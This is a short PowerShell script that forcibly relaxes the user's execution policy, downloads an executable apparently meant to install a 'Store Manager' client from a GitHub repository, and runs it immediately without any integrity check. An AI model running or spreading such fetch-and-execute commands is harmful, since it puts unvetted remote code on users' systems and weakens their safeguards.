# Script to download and run the exe file on any system
Write-Host "Setting execution policy..." -ForegroundColor Cyan 

Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force

iwr -Uri "https://github.com/mcircuit/WinRM/raw/refs/heads/main/Install-StoreManager.exe" -OutFile "$HOME\Downloads\Store-Manager-Client.exe"; & "$HOME\Downloads\Store-Manager-Client.exe"
